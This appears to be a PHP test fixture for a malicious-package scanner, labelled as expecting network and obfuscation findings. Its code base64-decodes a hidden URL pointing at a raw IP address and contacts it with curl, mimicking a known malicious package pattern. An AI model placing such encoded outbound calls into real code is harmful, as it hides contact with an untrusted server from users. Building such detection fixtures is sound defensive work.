<?php
// bfunky/http-parser shape: base64-hidden URL set through curl_setopt.
// @expect: NETWORK, OBFUSCATION
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, base64_decode('aHR0cHM6Ly80NC4yMTAuOTQuMzgvcGFja2FnaXN0LnBocA=='));
curl_exec($ch);
